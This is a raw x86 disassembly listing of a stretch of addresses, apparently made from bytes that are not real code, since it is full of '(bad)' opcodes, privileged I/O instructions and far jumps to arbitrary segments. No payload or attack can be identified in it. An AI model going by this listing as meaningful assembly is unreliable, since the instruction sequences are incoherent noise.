  42c8cd:	out    0x9,eax
  42c8cf:	daa    
  42c8d0:	xchg   esi,eax
  42c8d1:	(bad)  
  42c8d2:	ins    BYTE PTR es:[edi],dx
  42c8d3:	sbb    al,0x3
  42c8d5:	xor    BYTE PTR [ebp+0x68],0xda
  42c8d9:	fdiv   QWORD PTR [eax-0x1eb9d4a0]
  42c8df:	je     0x42c8ac
  42c8e1:	sub    BYTE PTR [esp+edx*8],bh
  42c8e4:	ins    BYTE PTR es:[edi],dx
  42c8e5:	sub    al,0xa7
  42c8e7:	repnz fdiv DWORD PTR [esi-0x5e64a7d8]
  42c8ee:	cmp    al,0xf5
  42c8f0:	(bad)  
  42c8f1:	sub    ebp,DWORD PTR [edi]
  42c8f3:	jge    0x42c95a
  42c8f5:	mov    eax,ds:0x5210cfb0
  42c8fa:	xchg   ecx,eax
  42c8fb:	fs pushf 
  42c8fd:	xchg   edi,eax
  42c8fe:	pop    edi
  42c8ff:	loop   0x42c942
  42c901:	and    al,0xda
  42c904:	addr16 inc esi
  42c906:	sbb    BYTE PTR [edi],al
  42c908:	fild   WORD PTR [edx+0x3d]
  42c90b:	mov    edx,DWORD PTR [ebp-0x10]
  42c90e:	imul   DWORD PTR [edi+0x0]
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x357b9333
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	outs   dx,DWORD PTR ds:[esi]
  42c98d:	mov    bh,0xe2
  42c98f:	xchg   esi,eax
  42c990:	std    
  42c991:	je     0x42c958
  42c993:	mov    ds:0x7ad96399,eax
  42c998:	and    BYTE PTR [ecx+eiz*4+0x53d9e032],ch
  42c99f:	pop    ds
  42c9a0:	fucomp st(3)
  42c9a2:	mov    ecx,0xba6427a2
  42c9a7:	xchg   edi,eax
  42c9a8:	call   0xb641:0x2e15a5f
  42c9af:	and    esp,DWORD PTR [esi]
  42c9b1:	outs   dx,DWORD PTR ds:[esi]
  42c9b2:	or     al,0xb9
  42c9b4:	jo     0x42c9dc
  42c9b6:	ss fcmovnb st,st(3)
  42c9b9:	sbb    eax,0xc13e4d96
  42c9be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9bf:	cdq    
  42c9c0:	cmp    BYTE PTR [eax+0x3c],0xc6
  42c9c4:	xchg   DWORD PTR fs:[esi+ecx*4-0x6bedc5ff],ebp
  42c9cc:	xchg   ah,ch
  42c9ce:	out    0x3c,al
  42c9d0:	popf   
  42c9d1:	xchg   edi,eax
  42c9d2:	cmp    BYTE PTR [eax+0x59],dh
  42c9d5:	jecxz  0x42c9d3
  42c9d7:	cs scas eax,DWORD PTR es:[edi]
  42c9d9:	aaa    
  42c9da:	daa    
  42c9db:	(bad)
  42c9de:	fcom   QWORD PTR [ebx]
  42c9e0:	retf   
  42c9e1:	pop    eax
  42c9e2:	xor    al,0x76
  42c9e4:	dec    esi
  42c9e5:	add    bl,ah
  42c9e7:	in     eax,dx
  42c9e8:	and    dh,bh
  42c9ea:	xchg   edi,eax
  42c9eb:	stos   DWORD PTR es:[edi],eax
  42c9ec:	jno    0x42c973
  42c9ee:	iret   
  42c9ef:	cmp    BYTE PTR [eax-0x22],cl
  42c9f2:	int    0xe7
  42c9f4:	mov    al,0xbf
  42c9f6:	or     DWORD PTR [edx],eax
  42c9f8:	inc    ecx
  42c9f9:	(bad)  
  42c9fa:	xlat   BYTE PTR ds:[ebx]
  42c9fb:	lahf   
  42c9fc:	sub    DWORD PTR [esi+ecx*4-0x44],ebx
  42ca00:	in     al,0xf8
  42ca02:	push   es
  42ca03:	test   DWORD PTR [edx-0x65],0x53879229
  42ca0a:	pop    eax
  42ca0b:	outs   dx,DWORD PTR ds:[esi]
  42ca0c:	push   eax
  42ca0d:	sub    ecx,edx
  42ca0f:	cdq    
  42ca10:	push   0x6b462c0c
  42ca15:	push   0x1b390e8e
  42ca1a:	adc    dl,dh
  42ca1c:	in     al,dx
  42ca1d:	cmp    edx,edx
  42ca1f:	mov    DWORD PTR [ecx],ecx
  42ca21:	mov    eax,ds:0xa4bcdcee
  42ca26:	and    BYTE PTR [edx],ah
  42ca28:	xchg   DWORD PTR [edi],ebp
  42ca2a:	out    0x60,al
  42ca2c:	jne    0x42ca76
  42ca2e:	xchg   esp,eax
  42ca2f:	std    
  42ca30:	inc    ecx
  42ca31:	push   es
  42ca32:	inc    eax
  42ca33:	xlat   BYTE PTR ds:[ebx]
  42ca34:	mov    ds:0x993e861e,eax
  42ca39:	mov    dl,BYTE PTR [edx-0x63]
  42ca3c:	push   cx
  42ca3e:	out    dx,al
  42ca3f:	test   al,0x6c
  42ca41:	stc    
  42ca42:	sub    cl,cl
  42ca44:	jecxz  0x42ca0d
  42ca46:	test   ch,ah
  42ca48:	inc    eax
  42ca49:	dec    edi
  42ca4a:	sub    al,0x8
  42ca4c:	sbb    al,al
  42ca4e:	xor    eax,0x98e8106b
  42ca53:	ins    DWORD PTR es:[edi],dx
  42ca54:	test   BYTE PTR [ebx-0x69],0x9
  42ca58:	or     edx,ebx
  42ca5a:	cmp    BYTE PTR [edx+edx*2-0x4a5e2a35],cl
  42ca61:	iret   
  42ca62:	and    al,0xb
  42ca64:	mov    cl,0x7c
  42ca66:	pushf  
  42ca67:	push   ebp
  42ca68:	ds in  al,0xd9
  42ca6b:	fs fs gs jbe 0x42cab7
  42ca70:	clc    
  42ca71:	pop    edi
  42ca72:	rcr    BYTE PTR [edi],0x6f
  42ca75:	cmp    dl,BYTE PTR [esi+0xb]
  42ca78:	mov    bl,0xf8
  42ca7a:	in     al,0xfb
  42ca7c:	hlt    
  42ca7d:	lds    ebp,FWORD PTR [ebp+edx*2-0x419205e9]
  42ca84:	xlat   BYTE PTR ds:[ebx]
  42ca85:	iret   
  42ca86:	inc    eax
  42ca87:	das    
  42ca88:	inc    edi
  42ca89:	paddw  mm3,QWORD PTR [edx+0x66]
  42ca8d:	and    eax,0x838d
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp-0x520e9140]
  42cb02:	icebp  
  42cb03:	sar    esp,0xdd
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    al,0x1
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	adc    eax,0x1950a6bb
  42cb11:	mov    ebp,fs
  42cb13:	or     al,0xb7
  42cb15:	es pop ebp
  42cb17:	push   ss
  42cb18:	xor    cl,dl
  42cb1a:	test   dh,bl
  42cb1c:	and    DWORD PTR [eax+0x5b],edx
  42cb1f:	fnstenv [ecx-0x51]
  42cb22:	ror    BYTE PTR ds:0x40a98112,cl
  42cb28:	xchg   ebx,eax
  42cb29:	xchg   edi,eax
  42cb2a:	push   edi
  42cb2b:	mov    ch,0x1
  42cb2d:	mov    WORD PTR [ebx+0x220a76a5],cs
  42cb33:	test   ch,dl
  42cb35:	cmp    BYTE PTR [eax],0xb6
  42cb38:	or     edx,DWORD PTR [ebp+0x44]
  42cb3b:	jmp    0x2dc2:0x5f667427
  42cb42:	mov    esi,gs
  42cb44:	or     BYTE PTR [esi+0x45757d05],bl
  42cb4a:	fdivp  st(0),st
  42cb4c:	mov    ebp,0x95123974
  42cb51:	cli    
  42cb52:	sahf   
  42cb53:	sbb    DWORD PTR [edi],0xffffffdd
  42cb56:	add    dh,BYTE PTR [ebx-0x2f6d33de]
  42cb5c:	and    DWORD PTR [edx-0xbee3457],edi
  42cb62:	or     eax,0x21e4724a
  42cb67:	or     ebx,DWORD PTR [ecx]
  42cb69:	push   0xffffff8e
  42cb6b:	xor    dh,BYTE PTR [esi-0xb]
  42cb6e:	pop    ds
  42cb6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb70:	and    ch,BYTE PTR [ecx]
  42cb72:	push   0xffffffb2
  42cb74:	ds mov ecx,0x8187046f
  42cb7a:	scas   al,BYTE PTR es:[edi]
  42cb7b:	imul   edi,DWORD PTR [ebp+0xbcb0393],0xdcad08dd
  42cb85:	bound  ebx,QWORD PTR [ebx-0x1d]
  42cb88:	(bad)  
  42cb8a:	imul   ebp,eax,0x6b6f99ae
  42cb90:	pcmpgtw mm6,QWORD PTR [ebx+0x5f]
  42cb94:	fist   DWORD PTR [esi]
  42cb96:	push   0x353b2e62
  42cb9b:	add    bh,ch
  42cb9d:	ret    0xc8f3
  42cba0:	pushf  
  42cba1:	(bad)  
  42cba2:	ficom  WORD PTR [eax]
  42cba4:	xchg   esi,eax
  42cba5:	add    ah,cl
  42cba7:	ja     0x42cbf0
  42cba9:	sbb    DWORD PTR [edi+0x1b],ecx
  42cbac:	scas   eax,DWORD PTR es:[edi]
  42cbad:	or     ebp,DWORD PTR [ebx]
  42cbaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cbb0:	popa   
  42cbb1:	call   0xc6d5:0x15a5b6e0
  42cbb8:	cmp    bl,BYTE PTR [eax]
  42cbba:	mov    ebx,0xce136f2e
  42cbbf:	fxch   st(4)
  42cbc1:	or     bh,BYTE PTR [eax-0x46]
  42cbc4:	into   
  42cbc5:	retf   0x19f1
  42cbc8:	sbb    DWORD PTR [edx+0xd582b61],0x56
  42cbcf:	adc    eax,DWORD PTR [eax+0x4d2e3cc7]
  42cbd5:	and    BYTE PTR [eax],dl
  42cbd7:	cmp    BYTE PTR [ebx],cl
  42cbd9:	repz adc ah,al
  42cbdc:	mov    bl,0xdd
  42cbde:	jmp    0xa20e:0x203eb29
  42cbe5:	xor    al,0x1c
  42cbe7:	jl     0x42cc32
  42cbe9:	and    DWORD PTR [eax],ebp
  42cbeb:	sbb    al,0x90
  42cbed:	inc    ebx
  42cbee:	pop    esp
  42cbef:	aaa    
  42cbf0:	push   edi
  42cbf1:	jl     0x42cb9a
  42cbf3:	adc    al,0x17
  42cbf5:	pop    ecx
  42cbf6:	js     0x42cbeb
  42cbf8:	mov    ecx,0xcf4e22d9
  42cbfd:	imul   esp,DWORD PTR [ebx+0x5f21dfce],0x6
  42cc04:	and    eax,DWORD PTR [ebx+0x43]
  42cc07:	and    al,0xee
  42cc09:	loopne 0x42cc06
  42cc0b:	scas   al,BYTE PTR es:[edi]
  42cc0c:	in     eax,0x9
  42cc0e:	inc    ecx
  42cc0f:	pop    DWORD PTR [eax]
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0xd63f0bc
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	sbb    DWORD PTR [ecx],0x3b
  42cc8f:	stos   DWORD PTR es:[edi],eax
  42cc90:	xchg   ebp,eax
  42cc91:	adc    BYTE PTR [ebx-0x26],al
  42cc94:	dec    ecx
  42cc95:	add    cl,BYTE PTR [edi+ecx*2]
  42cc98:	lods   al,BYTE PTR ds:[esi]
  42cc99:	pop    es
  42cc9a:	sub    edx,eax
  42cc9c:	cld    
  42cc9d:	leave  
  42cc9e:	add    BYTE PTR ds:0xa86b686f,dl
  42cca4:	(bad)  
  42cca6:	push   es
  42cca7:	dec    esi
  42cca8:	mov    edx,0xf99db882
  42ccad:	nop
  42ccae:	and    ebx,ebx
  42ccb0:	jecxz  0x42ccf4
  42ccb2:	ds inc esi
  42ccb4:	mov    esi,0xecd42ea
  42ccb9:	lea    ebp,[esi]
  42ccbb:	call   0x2f796443
  42ccc0:	jp     0x42ccc9
  42ccc2:	fcmovu st,st(6)
  42ccc4:	(bad)  
  42ccc5:	stos   BYTE PTR es:[edi],al
  42ccc6:	adc    DWORD PTR [ecx],ecx
  42ccc8:	and    al,0xdc
  42ccca:	dec    ebp
  42cccb:	sbb    ebx,DWORD PTR [ecx+ebx*4]
  42ccce:	jne    0x42cc59
  42ccd0:	ja     0x42cc94
  42ccd2:	addr16 call 0xff2ebd11
  42ccd8:	ds mov ebx,0x752f6550
  42ccde:	and    DWORD PTR [edx+eiz*2],edi
  42cce1:	lock pop ds
  42cce3:	mov    al,0xd4
  42cce5:	xchg   edi,eax
  42cce6:	sti    
  42cce7:	cli    
  42cce8:	rol    DWORD PTR [ebp+0x46],0xb1
  42ccec:	pushf  
  42cced:	sub    cl,BYTE PTR [edi+0x6906f689]
  42ccf3:	xchg   esp,eax
  42ccf4:	dec    ecx
  42ccf5:	call   0xeb5d4fe
  42ccfa:	mov    al,0x6c
  42ccfc:	mov    ds:0x9c1cc78a,al
  42cd01:	out    0xd5,eax
  42cd03:	(bad)  
  42cd04:	nop
  42cd05:	push   edx
  42cd06:	dec    edi
  42cd07:	leave  
  42cd08:	cs xchg esi,eax
  42cd0a:	sbb    eax,0xa81f2549
  42cd0f:	jnp    0x42cd69
  42cd11:	and    bh,BYTE PTR [ebx+0x6c028b6d]
  42cd17:	retf   
  42cd18:	inc    edx
  42cd19:	std    
  42cd1a:	sub    eax,0x1e2f90d7
  42cd1f:	int3   
  42cd20:	(bad)  
  42cd21:	in     eax,dx
  42cd22:	scas   eax,DWORD PTR es:[edi]
  42cd23:	adc    eax,0x7522cbc7
  42cd28:	das    
  42cd29:	ss pop ecx
  42cd2b:	mov    cl,BYTE PTR [esi-0x4f]
  42cd2e:	jmp    0xa439:0xc42c5d86
  42cd35:	icebp  
  42cd36:	xor    al,0x36
  42cd38:	mov    DWORD PTR [ebp+0x5b],ebx
  42cd3b:	mov    cl,BYTE PTR [edx+0x0]
  42cd3e:	daa    
  42cd3f:	jno    0x42cdb5
  42cd41:	xchg   esp,eax
  42cd42:	push   0xb0d86305
  42cd47:	add    eax,0x22119c79
  42cd4c:	aas    
  42cd4d:	pop    es
  42cd4e:	dec    esi
  42cd4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd50:	(bad)  
  42cd51:	jmp    0x42cd8a
  42cd53:	xor    cl,bl
  42cd55:	sbb    bh,BYTE PTR [eax-0x59]
  42cd58:	int    0x90
  42cd5a:	ret    
  42cd5b:	int3   
  42cd5c:	ret    0xfee0
  42cd5f:	ret    
  42cd60:	inc    edi
  42cd61:	push   esp
  42cd62:	ss mov ebx,ecx
  42cd65:	int3   
  42cd66:	mov    dl,0xf9
  42cd68:	cmp    BYTE PTR [eax-0x61],bh
  42cd6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd6c:	scas   eax,DWORD PTR es:[edi]
  42cd6d:	jmp    0x9320:0xe348b12d
  42cd74:	clc    
  42cd75:	(bad)  [edx-0x766eba14]
  42cd7b:	mov    BYTE PTR [ecx*4+0x2d8010db],dh
  42cd82:	dec    esp
  42cd83:	and    eax,0xb6731453
  42cd88:	out    0x76,eax
  42cd8a:	push   ebp
  42cd8b:	mov    esi,0xf555016f
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x85
  42ce01:	and    ebx,DWORD PTR [ecx-0x5c]
  42ce04:	add    al,0xe0
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	jmp    0x7e4e:0xaf3db148
  42ce13:	pop    eax
  42ce14:	ja     0x42cdc8
  42ce16:	arpl   WORD PTR [ebp+0x76544e13],bp
  42ce1c:	sub    BYTE PTR [edx-0x3dd63c9d],0xf9
  42ce23:	fidivr DWORD PTR [ebp+0x8f1ee72]
  42ce29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce2a:	pop    edi
  42ce2b:	mov    BYTE PTR [ebx],bh
  42ce2d:	push   ebp
  42ce2e:	jecxz  0x42cdf0
  42ce30:	add    al,0xa9
  42ce32:	jb     0x42ce05
  42ce34:	jmp    0xf06b28bc
  42ce39:	and    DWORD PTR [eax-0x1c],ecx
  42ce3c:	test   eax,0xd52a6d1a
  42ce41:	xchg   ecx,eax
  42ce42:	ja     0x42cebd
  42ce44:	nop
  42ce45:	mov    dl,0x2d
  42ce47:	ins    BYTE PTR es:[edi],dx
  42ce48:	imul   edi,esi,0x42
  42ce4b:	inc    ebp
  42ce4c:	sbb    al,0x7d
  42ce4e:	into   
  42ce4f:	addr16 pop esp
  42ce51:	mov    al,ds:0x16ba8276
  42ce56:	jmp    0x5d507f70
  42ce5b:	call   0xf5a7:0x3b2d63b8
  42ce62:	add    eax,0xfffffff9
  42ce65:	mov    ah,0xf1
  42ce67:	call   0x44cb:0x8366335f
  42ce6e:	cwde   
  42ce6f:	ins    BYTE PTR es:[edi],dx
  42ce70:	mov    bh,0x63
  42ce72:	jl     0x42cec7
  42ce74:	mov    ah,0xd7
  42ce76:	std    
  42ce77:	pop    ss
  42ce78:	test   BYTE PTR [ebx],ch
  42ce7a:	lea    edx,[ebx-0x18]
  42ce7d:	adc    bl,BYTE PTR [ebx]
  42ce7f:	sub    al,0x1b
  42ce81:	std    
  42ce82:	push   ds
  42ce83:	repz mov edx,0xa57c2c83
  42ce89:	mov    ds:0xfd10e403,al
  42ce8e:	pop    eax
  42ce8f:	mov    ebx,0x7d6ac0d0
  42ce94:	out    dx,eax
  42ce95:	out    0x88,al
  42ce97:	add    al,0xc8
  42ce99:	js     0x42cee7
  42ce9b:	push   es
  42ce9c:	lea    ebp,[ebx-0x32104a05]
  42cea2:	scas   eax,DWORD PTR es:[edi]
  42cea3:	leave  
  42cea4:	xchg   ebx,eax
  42cea5:	test   al,0x8b
  42cea7:	sbb    al,0x4f
  42cea9:	mov    edi,0xcaa5075e
  42ceae:	push   ecx
  42ceaf:	scas   eax,DWORD PTR es:[edi]
  42ceb0:	ret    0x924e
  42ceb3:	aaa    
  42ceb4:	lock sbb eax,0xd5da6061
  42ceba:	push   esp
  42cebb:	popf   
  42cebc:	and    eax,0x6bdd5094
  42cec1:	jae    0x93ef8f6a
  42cec7:	xchg   edx,eax
  42cec8:	(bad)  
  42ceca:	fs call 0xbc4f1e4d
  42ced0:	fidivr WORD PTR [ebp+0x7f971055]
  42ced6:	add    cl,BYTE PTR [ebx-0x765a5c86]
  42cedc:	pop    es
  42cedd:	dec    ebp
  42cede:	adc    eax,0x192da61f
  42cee3:	call   0xd48bf508
  42cee8:	test   ah,0x4c
  42ceeb:	pop    es
  42ceec:	xchg   edi,eax
  42ceed:	cmp    al,0x62
  42ceef:	addr16 std 
  42cef1:	das    
  42cef2:	sub    dl,BYTE PTR [ebp+0x8e5764]
  42cef8:	stos   DWORD PTR es:[edi],eax
  42cef9:	sbb    eax,0xfd205bcb
  42cefe:	ret    0xb342
  42cf01:	pop    edi
  42cf02:	add    DWORD PTR [ecx+0x494c5772],0x1f0a22a1
  42cf0c:	(bad)  
  42cf0d:	out    dx,al
  42cf0e:	xchg   ebp,eax
  42cf0f:	push   esi
	...
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	(bad)  
  42cf80:	std    
  42cf81:	add    al,0xdc
  42cf83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf84:	or     cl,ah
  42cf86:	add    DWORD PTR [eax],eax
  42cf88:	add    al,0x1
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	mov    edi,cr3
  42cf8f:	cld    
  42cf90:	(bad)  
  42cf91:	xchg   esp,eax
  42cf92:	jmp    0x81a6e46
  42cf97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cf98:	or     eax,0x54b7f823
  42cf9d:	mov    ds:0xac85644e,eax
  42cfa2:	ja     0x42cfd2
  42cfa4:	mov    ecx,eax
  42cfa6:	jmp    0x42cf57
  42cfa8:	sub    BYTE PTR [eax-0x33],ah
  42cfab:	xor    edi,esi
  42cfad:	or     DWORD PTR [edx],esi
  42cfaf:	loop   0x42cf56
  42cfb1:	jge    0x42d02d
  42cfb3:	inc    edi
  42cfb4:	adc    esi,DWORD PTR [ebp-0x4d]
  42cfb7:	icebp  
  42cfb8:	cmp    ah,BYTE PTR [ebp+0x69]
  42cfbb:	mov    dl,0x37
  42cfbd:	and    BYTE PTR [edx],0x75
  42cfc0:	pop    ss
  42cfc1:	fbstp  TBYTE PTR [edx+esi*8]
  42cfc4:	xor    edi,edi
  42cfc6:	mov    ds:0xfea9c5d5,al
  42cfcb:	inc    ebp
  42cfcc:	add    esi,DWORD PTR [ebx]
  42cfce:	add    edx,esp
  42cfd0:	hlt    
  42cfd1:	inc    ebx
  42cfd2:	ja     0x42cfc7
  42cfd4:	lahf   
  42cfd5:	pop    edi
  42cfd6:	push   ss
  42cfd7:	icebp  
  42cfd8:	mov    edi,0x588f5a42
  42cfdd:	cmp    bl,ch
  42cfdf:	das    
  42cfe0:	dec    esp
  42cfe1:	pop    ebx
  42cfe2:	pusha  
  42cfe3:	inc    ecx
  42cfe4:	stos   DWORD PTR es:[edi],eax
  42cfe5:	inc    eax
  42cfe6:	lock add al,0x52
  42cfe9:	aam    0x26
  42cfeb:	lds    ebx,FWORD PTR [esi+0x52]
  42cfee:	stos   BYTE PTR es:[edi],al
  42cfef:	ins    DWORD PTR es:[edi],dx
  42cff0:	retf   
  42cff1:	inc    edi
  42cff2:	add    BYTE PTR [ebx+ecx*2],bh
  42cff5:	rcr    DWORD PTR [edx],cl
  42cff7:	push   eax
  42cff8:	pop    esi
  42cff9:	jbe    0x42d074
  42cffb:	imul   esi,DWORD PTR [edi-0x2589fa3b],0x3d
  42d002:	sub    ebx,esp
  42d004:	call   0x7f8a:0x2572b810
  42d00b:	mov    dl,0xa9
  42d00d:	xchg   esi,eax
  42d00e:	mov    ecx,0xa27ec842
  42d013:	test   BYTE PTR [ecx-0x56e7aa79],bh
  42d019:	mov    al,ds:0x3777761
  42d01e:	pop    esp
  42d01f:	loope  0x42d065
  42d021:	mov    WORD PTR [edx+ecx*4+0x66],gs
  42d025:	mov    edx,0x4dd36ae9
  42d02a:	nop
  42d02b:	dec    ecx
  42d02c:	int3   
  42d02d:	fdivp  st(2),st
  42d02f:	dec    esi
  42d030:	mov    BYTE PTR [edx],dl
  42d032:	std    
  42d033:	add    al,0x4e
  42d035:	imul   edx,DWORD PTR [ecx+esi*4-0x64a8018a],0xda037205
  42d040:	lds    esp,FWORD PTR [ebp-0x2]
  42d043:	sub    al,0xdc
  42d045:	inc    ebx
  42d046:	stos   BYTE PTR es:[edi],al
  42d047:	into   
  42d048:	push   esp
  42d049:	imul   eax,DWORD PTR [ebx-0x19a614e5],0x7f52df87
  42d053:	xchg   BYTE PTR [edx],bh
  42d055:	fs pop esi
  42d057:	ss pusha 
  42d059:	dec    edi
  42d05a:	mov    esp,DWORD PTR [edi+0x23]
  42d05d:	pop    esi
  42d05e:	rol    BYTE PTR [eax+0x64],1
  42d061:	fbld   TBYTE PTR [edi+0xdffd925]
  42d067:	dec    esp
  42d068:	xor    esi,DWORD PTR [eax-0x3bc63877]
  42d06e:	inc    eax
  42d06f:	mov    eax,0x5cbce609
  42d074:	mov    cl,0xe5
  42d076:	into   
  42d077:	inc    edi
  42d078:	pop    eax
  42d079:	xlat   BYTE PTR ds:[ebx]
  42d07a:	iret   
  42d07b:	fst    DWORD PTR [edi-0x49]
  42d07e:	xor    DWORD PTR [edi],edx
  42d080:	fldcw  WORD PTR [ecx]
  42d082:	mov    edi,0xab2c3d60
  42d087:	jg     0x42d077
  42d089:	sub    eax,0xc684a340
  42d08e:	repz in al,dx
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [eax+ebx*4+0x72],dl
  42d103:	hlt    
  42d104:	or     al,0xe2
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	mov    bl,0x4d
  42d10e:	push   ss
  42d10f:	fld    TBYTE PTR [eax+0x3711f82d]
  42d115:	popf   
  42d116:	(bad)  
  42d117:	adc    esi,ebx
  42d119:	add    dh,BYTE PTR [eax+0x48e9d9d3]
  42d11f:	push   0xffffff80
  42d121:	xor    esi,DWORD PTR [esp+ecx*2]
  42d124:	add    al,0x6b
  42d126:	adc    ecx,edi
  42d128:	xchg   ebp,eax
  42d129:	adc    al,0x3f
  42d12b:	les    edi,FWORD PTR [ebx]
  42d12d:	out    0x28,al
  42d12f:	xchg   ebx,eax
  42d130:	dec    edi
  42d131:	add    DWORD PTR [ecx],ebx
  42d133:	mov    edi,0x4c0058fb
  42d138:	(bad)  
  42d139:	data16 rcr BYTE PTR [ebp-0x270d8f78],0xde
  42d141:	xchg   edi,eax
  42d142:	fsub   st(6),st
  42d144:	jmp    0x6fa:0x7dbe4530
  42d14b:	in     al,dx
  42d14c:	loopne 0x42d0e5
  42d14e:	xor    eax,0xfd88ef37
  42d153:	bound  ecx,QWORD PTR [ebx-0x73]
  42d156:	and    al,0xcb
  42d158:	sbb    bl,BYTE PTR [edi-0x17]
  42d15b:	(bad)  
  42d15c:	(bad)  
  42d15d:	fsubr  st,st(0)
  42d15f:	leave  
  42d160:	push   cs
  42d161:	push   esp
  42d162:	mov    cl,0x50
  42d164:	int    0x8c
  42d166:	mov    bh,0x7e
  42d168:	fwait
  42d169:	call   0xcaf85741
  42d16e:	mov    al,ds:0x73adbe3a
  42d173:	(bad)  
  42d174:	mov    dh,0x55
  42d176:	mov    ds:0xed03801d,eax
  42d17b:	and    al,0xed
  42d17d:	sbb    edx,DWORD PTR [edx]
  42d17f:	pop    edi
  42d180:	sub    bl,BYTE PTR [ecx-0x7a]
  42d183:	jno    0x42d115
  42d185:	pmulhw mm1,QWORD PTR [edx+0x227ff3a3]
  42d18c:	ret    0x29b4
  42d18f:	std    
  42d190:	fldenv [ebx+0x58]
  42d193:	or     dl,BYTE PTR [edx+ebx*8]
  42d196:	sbb    BYTE PTR fs:[ebp-0xbb9c9f1],al
  42d19d:	mov    esi,ebp
  42d19f:	in     eax,dx
  42d1a0:	xchg   DWORD PTR [ecx-0x57],esp
  42d1a3:	inc    esp
  42d1a4:	xchg   DWORD PTR [esi-0x41478f65],ebx
  42d1aa:	jb     0x42d1e1
  42d1ac:	mov    WORD PTR [edi-0x1b],cs
  42d1af:	mov    BYTE PTR [eax],bl
  42d1b1:	mov    eax,0xd96e0ef2
  42d1b6:	test   al,0xc5
  42d1b8:	test   BYTE PTR [edx-0x70],bh
  42d1bb:	inc    edi
  42d1bc:	mov    bl,0x99
  42d1be:	arpl   WORD PTR [ecx+0x1244adfe],cx
  42d1c4:	xchg   esi,eax
  42d1c5:	in     eax,dx
  42d1c6:	push   ss
  42d1c7:	fsub   st(6),st
  42d1c9:	lods   eax,DWORD PTR ds:[esi]
  42d1ca:	push   0xffffffee
  42d1cc:	jns    0x42d19d
  42d1ce:	icebp  
  42d1cf:	repnz pop ebx
  42d1d1:	mov    dh,0x80
  42d1d3:	push   edx
  42d1d4:	into   
  42d1d5:	sub    eax,0x2f1a560b
  42d1da:	push   edi
  42d1db:	xchg   BYTE PTR [edi+0x24e418c6],ah
  42d1e1:	(bad)  [esi+ebp*1]
  42d1e4:	lods   al,BYTE PTR ds:[esi]
  42d1e5:	je     0x42d1cc
  42d1e7:	and    eax,0xf4fa682b
  42d1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1ed:	and    edi,0xffffffa7
  42d1f0:	and    al,BYTE PTR [eax-0x28323d28]
  42d1f6:	mov    ebx,0x20598241
  42d1fb:	jmp    0xc617f405
  42d200:	jle    0x42d22d
  42d202:	dec    esi
  42d203:	or     DWORD PTR [edi-0x5f2bde1b],edx
  42d209:	dec    ecx
  42d20a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d20b:	fldenv [edx+edx*2+0xd7aa]
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2b9
  42d281:	jle    0x42d2de
  42d283:	xchg   esp,eax
  42d284:	adc    bl,ah
  42d286:	add    DWORD PTR [eax],eax
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	in     al,0x21
  42d28e:	mov    ebp,0x4581a58d
  42d293:	add    edi,ecx
  42d295:	jg     0x42d297
  42d297:	mov    edx,0xc780ef3a
  42d29c:	push   ecx
  42d29d:	mov    al,0xc0
  42d29f:	inc    ecx
  42d2a0:	dec    edi
  42d2a1:	jbe    0x42d22d
  42d2a3:	jg     0x42d245
  42d2a5:	cdq    
  42d2a6:	out    dx,al
  42d2a7:	je     0x42d22e
  42d2a9:	popa   
  42d2aa:	aad    0x1f
  42d2ac:	std    
  42d2ad:	mov    DWORD PTR [edi-0x1474785a],ebx
  42d2b3:	mov    eax,ds:0x849c3535
